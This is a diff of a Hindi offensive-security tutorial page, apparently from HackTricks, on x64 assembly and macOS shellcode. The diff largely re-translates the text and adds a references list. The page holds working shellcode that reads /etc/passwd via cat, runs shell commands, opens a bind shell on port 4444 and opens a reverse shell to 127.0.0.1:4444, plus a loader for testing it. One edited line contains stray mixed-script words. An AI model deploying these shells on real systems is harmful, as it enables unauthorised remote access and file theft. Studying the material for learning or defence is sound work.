@@ -4,72 +4,72 @@
 
 ## **x64 का परिचय**
 
-x64, जिसे x86-64 के नाम से भी जाना जाता है, एक 64-बिट प्रोसेसर आर्किटेक्चर है जो मुख्य रूप से डेस्कटॉप और सर्वर कंप्यूटिंग में उपयोग किया जाता है। यह Intel द्वारा निर्मित x86 आर्किटेक्चर से उत्पन्न हुआ और बाद में AMD द्वारा AMD64 नाम से अपनाया गया, यह आज व्यक्तिगत कंप्यूटरों और सर्वरों में प्रचलित आर्किटेक्चर है।
+x64, जिसे x86-64 के नाम से भी जाना जाता है, एक 64-bit processor architecture है जिसका उपयोग मुख्य रूप से desktop और server computing में किया जाता है। यह Intel द्वारा निर्मित x86 architecture से विकसित हुआ और बाद में AMD द्वारा AMD64 नाम से अपनाया गया। आज यह personal computers और servers में सबसे अधिक प्रचलित architecture है।
 
-### **रजिस्टर**
+### **Registers**
 
-x64 x86 आर्किटेक्चर का विस्तार करता है, जिसमें **16 सामान्य-उद्देश्य रजिस्टर** होते हैं जिन्हें `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, और `r8` से `r15` तक लेबल किया गया है। इनमें से प्रत्येक **64-बिट** (8-बाइट) मान को स्टोर कर सकता है। इन रजिस्टरों में 32-बिट, 16-बिट, और 8-बिट उप-रजिस्टर भी होते हैं जो संगतता और विशिष्ट कार्यों के लिए होते हैं।
+x64, x86 architecture का विस्तार है और इसमें **16 general-purpose registers** होते हैं, जिन्हें `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, और `r8` से `r15` तक नाम दिया गया है। इनमें से प्रत्येक **64-bit** (8-byte) value store कर सकता है। Compatibility और विशेष tasks के लिए इन registers में 32-bit, 16-bit और 8-bit sub-registers भी होते हैं।
 
-1. **`rax`** - पारंपरिक रूप से **फंक्शंस** से **रिटर्न वैल्यू** के लिए उपयोग किया जाता है।
-2. **`rbx`** - अक्सर मेमोरी ऑपरेशंस के लिए **बेस रजिस्टर** के रूप में उपयोग किया जाता है।
-3. **`rcx`** - सामान्यतः **लूप काउंटर** के लिए उपयोग किया जाता है।
-4. **`rdx`** - विभिन्न भूमिकाओं में उपयोग किया जाता है जिसमें विस्तारित अंकगणितीय ऑपरेशंस शामिल हैं।
-5. **`rbp`** - स्टैक फ्रेम के लिए **बेस पॉइंटर**।
-6. **`rsp`** - **स्टैक पॉइंटर**, जो स्टैक के शीर्ष को ट्रैक करता है।
-7. **`rsi`** और **`rdi`** - स्ट्रिंग/मेमोरी ऑपरेशंस में **स्रोत** और **गंतव्य** इंडेक्स के लिए उपयोग किया जाता है।
-8. **`r8`** से **`r15`** - x64 में पेश किए गए अतिरिक्त सामान्य-उद्देश्य रजिस्टर।
+1. **`rax`** - परंपरागत रूप से functions से प्राप्त **return values** के लिए उपयोग किया जाता है।
+2. **`rbx`** - Memory operations के लिए अक्सर **base register** के रूप में उपयोग किया जाता है।
+3. **`rcx`** - आमतौर पर **loop counters** के लिए उपयोग किया जाता है।
+4. **`rdx`** - Extended arithmetic operations सहित विभिन्न भूमिकाओं में उपयोग किया जाता है।
+5. **`rbp`** - Stack frame के लिए **base pointer**।
+6. **`rsp`** - **Stack pointer**, जो stack के top को track करता है।
+7. **`rsi`** और **`rdi`** - String/memory operations में **source** और **destination** indexes के लिए उपयोग किए जाते हैं।
+8. **`r8`** से **`r15`** - x64 में जोड़े गए अतिरिक्त general-purpose registers।
 
-### **कॉलिंग कन्वेंशन**
+### **Calling Convention**
 
-x64 कॉलिंग कन्वेंशन ऑपरेटिंग सिस्टम के बीच भिन्न होता है। उदाहरण के लिए:
+x64 calling convention operating systems के बीच अलग-अलग होती है। उदाहरण के लिए:
 
-- **Windows**: पहले **चार पैरामीटर** रजिस्टर **`rcx`**, **`rdx`**, **`r8`**, और **`r9`** में पास किए जाते हैं। आगे के पैरामीटर स्टैक पर पुश किए जाते हैं। रिटर्न वैल्यू **`rax`** में होती है।
-- **System V (जो UNIX-लाइक सिस्टम में सामान्यतः उपयोग होता है)**: पहले **छह पूर्णांक या पॉइंटर पैरामीटर** रजिस्टर **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, और **`r9`** में पास किए जाते हैं। रिटर्न वैल्यू भी **`rax`** में होती है।
+- **Windows**: पहले **चार parameters** registers **`rcx`**, **`rdx`**, **`r8`**, और **`r9`** में pass किए जाते हैं। अतिरिक्त parameters को stack पर push किया जाता है। Return value **`rax`** में होती है।
+- **System V (आमतौर पर UNIX-like systems में उपयोग किया जाता है)**: पहले **छह integer या pointer parameters** registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, और **`r9`** में pass किए जाते हैं। Return value भी **`rax`** में होती है।
 
-यदि फंक्शन में छह से अधिक इनपुट हैं, तो **बाकी स्टैक पर पास किए जाएंगे**। **RSP**, स्टैक पॉइंटर, को **16 बाइट्स संरेखित** होना चाहिए, जिसका अर्थ है कि जिस पते की ओर यह इशारा करता है, वह किसी भी कॉल से पहले 16 से विभाज्य होना चाहिए। इसका मतलब है कि सामान्यतः हमें यह सुनिश्चित करने की आवश्यकता होगी कि RSP हमारे शेलकोड में सही ढंग से संरेखित है इससे पहले कि हम फंक्शन कॉल करें। हालाँकि, प्रैक्टिस में, सिस्टम कॉल कई बार काम करते हैं भले ही यह आवश्यकता पूरी न हो।
+यदि function में छह से अधिक inputs हों, तो **बाकी inputs stack पर pass किए जाएंगे**। **RSP**, अर्थात stack pointer, **16 bytes aligned** होना चाहिए, जिसका अर्थ है कि जिस address की ओर यह point करता है, वह किसी भी call के होने से पहले 16 से विभाज्य होना चाहिए। इसका अर्थ है कि सामान्यतः function call करने से पहले हमें अपने shellcode में यह सुनिश्चित करना होगा कि RSP उचित रूप से aligned हो। हालांकि, व्यवहार में system calls कई बार इस requirement के पूरा न होने पर भी काम करते हैं।
 
-### Swift में कॉलिंग कन्वेंशन
+### Calling Convention in Swift
 
-Swift का अपना **कॉलिंग कन्वेंशन** है जिसे [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) में पाया जा सकता है।
+Swift की अपनी **calling convention** है, जिसे [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) पर पाया जा सकता है।
 
-### **सामान्य निर्देश**
+### **Common Instructions**
 
-x64 निर्देशों का एक समृद्ध सेट है, जो पहले के x86 निर्देशों के साथ संगतता बनाए रखता है और नए निर्देशों को पेश करता है।
+x64 instructions का एक समृद्ध set है, जो पहले के x86 instructions के साथ compatibility बनाए रखता है और नए instructions भी प्रस्तुत करता है।
 
-- **`mov`**: एक **रजिस्टर** या **मेमोरी स्थान** से दूसरे में एक मान **स्थानांतरित** करें।
-- उदाहरण: `mov rax, rbx` — `rbx` से `rax` में मान स्थानांतरित करता है।
-- **`push`** और **`pop`**: स्टैक पर मानों को पुश या पॉप करें।
-- उदाहरण: `push rax` — `rax` में मान को स्टैक पर पुश करता है।
-- उदाहरण: `pop rax` — स्टैक से शीर्ष मान को `rax` में पॉप करता है।
-- **`add`** और **`sub`**: **जोड़** और **घटाव** ऑपरेशंस।
-- उदाहरण: `add rax, rcx` — `rax` और `rcx` में मानों को जोड़ता है और परिणाम को `rax` में स्टोर करता है।
-- **`mul`** और **`div`**: **गुणा** और **भाग** ऑपरेशंस। नोट: इनका ऑपरेटर उपयोग के संबंध में विशिष्ट व्यवहार होता है।
-- **`call`** और **`ret`**: **फंक्शंस** को **कॉल** और **रिटर्न** करने के लिए उपयोग किया जाता है।
-- **`int`**: एक सॉफ़्टवेयर **इंटरप्ट** को ट्रिगर करने के लिए उपयोग किया जाता है। उदाहरण: `int 0x80` 32-बिट x86 Linux में सिस्टम कॉल के लिए उपयोग किया गया था।
-- **`cmp`**: दो मानों की **तुलना** करें और परिणाम के आधार पर CPU के फ्लैग सेट करें।
+- **`mov`**: किसी **register** या **memory location** से किसी अन्य register या memory location में value **move** करना।
+- उदाहरण: `mov rax, rbx` — `rbx` की value को `rax` में move करता है।
+- **`push`** और **`pop`**: Values को **stack** पर push करना या stack से pop करना।
+- उदाहरण: `push rax` — `rax` की value को stack पर push करता है।
+- उदाहरण: `pop rax` — stack की top value को `rax` में pop करता है।
+- **`add`** और **`sub`**: **Addition** और **subtraction** operations।
+- उदाहरण: `add rax, rcx` — `rax` और `rcx` की values को जोड़कर result को `rax` में store करता है।
+- **`mul`** और **`div`**: **Multiplication** और **division** operations। Note: operand usage के संबंध में इनके specific behaviors होते हैं।
+- **`call`** और **`ret`**: **Functions को call करने** और **उनसे return करने** के लिए उपयोग किए जाते हैं।
+- **`int`**: Software **interrupt** trigger करने के लिए उपयोग किया जाता है। उदाहरण के लिए, 32-bit x86 Linux में system calls के लिए `int 0x80` का उपयोग किया जाता था।
+- **`cmp`**: दो values को **compare** करता है और result के आधार पर CPU के flags set करता है।
 - उदाहरण: `cmp rax, rdx` — `rax` की तुलना `rdx` से करता है।
-- **`je`, `jne`, `jl`, `jge`, ...**: **संविधानात्मक कूद** निर्देश जो पिछले `cmp` या परीक्षण के परिणामों के आधार पर नियंत्रण प्रवाह को बदलते हैं।
-- उदाहरण: `cmp rax, rdx` निर्देश के बाद, `je label` — यदि `rax` `rdx` के बराबर है तो `label` पर कूदता है।
-- **`syscall`**: कुछ x64 सिस्टम (जैसे आधुनिक Unix) में **सिस्टम कॉल** के लिए उपयोग किया जाता है।
-- **`sysenter`**: कुछ प्लेटफार्मों पर एक अनुकूलित **सिस्टम कॉल** निर्देश।
+- **`je`, `jne`, `jl`, `jge`, ...**: **Conditional jump** instructions, जो पिछले `cmp` या test के results के आधार पर control flow बदलते हैं।
+- उदाहरण: `cmp rax, rdx` instruction के बाद `je label` — यदि `rax`, `rdx` के बराबर है, तो `label` पर jump करता है।
+- **`syscall`**: कुछ x64 systems (जैसे modern Unix) में **system calls** के लिए उपयोग किया जाता है।
+- **`sysenter`**: कुछ platforms पर optimized **system call** instruction।
 
-### **फंक्शन प्रोलॉग**
+### **Function Prologue**
 
-1. **पुराने बेस पॉइंटर को पुश करें**: `push rbp` (कॉलर के बेस पॉइंटर को सहेजता है)
-2. **वर्तमान स्टैक पॉइंटर को बेस पॉइंटर में स्थानांतरित करें**: `mov rbp, rsp` (वर्तमान फंक्शन के लिए नए बेस पॉइंटर को सेट करता है)
-3. **स्थानीय वेरिएबल्स के लिए स्टैक पर स्थान आवंटित करें**: `sub rsp, <size>` (जहाँ `<size>` आवश्यक बाइट्स की संख्या है)
+1. **पुराने base pointer को push करना**: `push rbp` (caller के base pointer को save करता है)
+2. **वर्तमान stack pointer को base pointer में move करना**: `mov rbp, rsp` (वर्तमान function के लिए नया base pointer set करता है)
+3. **Local variables के लिए stack पर space allocate करना**: `sub rsp, <size>` (जहां `<size>` आवश्यक bytes की संख्या है)
 
-### **फंक्शन एपिलॉग**
+### **Function Epilogue**
 
-1. **वर्तमान बेस पॉइंटर को स्टैक पॉइंटर में स्थानांतरित करें**: `mov rsp, rbp` (स्थानीय वेरिएबल्स को डिअलॉकेट करें)
-2. **स्टैक से पुराने बेस पॉइंटर को पॉप करें**: `pop rbp` (कॉलर के बेस पॉइंटर को पुनर्स्थापित करता है)
-3. **रिटर्न करें**: `ret` (कॉलर को नियंत्रण लौटाता है)
+1. **वर्तमान base pointer को stack pointer में move करना**: `mov rsp, rbp` (local variables को deallocate करता है)
+2. **पुराने base pointer को stack से pop करना**: `pop rbp` (caller के base pointer को restore करता है)
+3. **Return करना**: `ret` (control को caller के पास return करता है)
 
 ## macOS
 
 ### syscalls
 
-syscalls की विभिन्न श्रेणियाँ हैं, आप [**यहाँ उन्हें खोज सकते हैं**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
+syscalls की अलग-अलग classes होती हैं, जिन्हें आप [**यहां पा सकते हैं**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -78,7 +78,7 @@ syscalls की विभिन्न श्रेणियाँ हैं, आ
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-फिर, आप प्रत्येक syscall संख्या [**इस URL में**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+इसके बाद, आप प्रत्येक syscall number [**इस URL में**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:** શોધ سکتے हैं.
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -95,18 +95,18 @@ syscalls की विभिन्न श्रेणियाँ हैं, आ
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-इसलिए `open` syscall (**5**) को **Unix/BSD वर्ग** से कॉल करने के लिए आपको इसे जोड़ना होगा: `0x2000000`
+इसलिए **Unix/BSD class** से `open` syscall (**5**) को call करने के लिए आपको इसे जोड़ना होगा: `0x2000000`
 
-तो, open को कॉल करने के लिए syscall संख्या होगी `0x2000005`
+इसलिए open को call करने के लिए syscall number `0x2000005` होगा
 
 ### Shellcodes
 
-संकलित करने के लिए:
+Compile करने के लिए:
 ```bash
 nasm -f macho64 shell.asm -o shell.o
 ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
 ```
-बाइट्स निकालने के लिए:
+Bytes extract करने के लिए:
 ```bash
 # Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
 for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
@@ -118,7 +118,7 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 ```
 <details>
 
-<summary>शेलकोड का परीक्षण करने के लिए C कोड</summary>
+<summary>shellcode का परीक्षण करने के लिए C code</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -166,9 +166,9 @@ return 0;
 ```
 </details>
 
-#### शेल
+#### Shell
 
-[**यहाँ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) से लिया गया और समझाया गया।
+[**यहां से**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) लिया गया और समझाया गया।<sup>[1]</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -207,9 +207,9 @@ syscall
 {{#endtab}}
 {{#endtabs}}
 
-#### कैट के साथ पढ़ें
+#### cat से पढ़ें
 
-लक्ष्य है `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को निष्पादित करना, इसलिए दूसरा तर्क (x1) पैरामीटर का एक ऐरे है (जो मेमोरी में इनका मतलब पतों का एक स्टैक है)।
+लक्ष्य `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को execute करना है, इसलिए दूसरा argument (x1) params की एक array है (जो memory में addresses के stack को दर्शाती है)।
 ```armasm
 bits 64
 section .text
@@ -240,7 +240,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### sh के साथ कमांड को लागू करें
+#### sh के साथ command invoke करें
 ```armasm
 bits 64
 section .text
@@ -280,7 +280,7 @@ touch_command:  db "touch /tmp/lalala", 0
 ```
 #### Bind shell
 
-Bind shell from [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **port 4444**
+[https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) से **port 4444** में Bind shell<sup>[2]</sup>।
 ```armasm
 section .text
 global _main
@@ -355,9 +355,9 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### रिवर्स शेल
+#### Reverse Shell
 
-रिवर्स शेल [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) से। रिवर्स शेल **127.0.0.1:4444** पर
+[https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) से Reverse shell। **127.0.0.1:4444** पर Reverse shell<sup>[3]</sup>।
 ```armasm
 section .text
 global _main
@@ -419,4 +419,10 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+## संदर्भ
+
+- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
+- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
+- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)
+
 {{#include ../../../banners/hacktricks-training.md}}
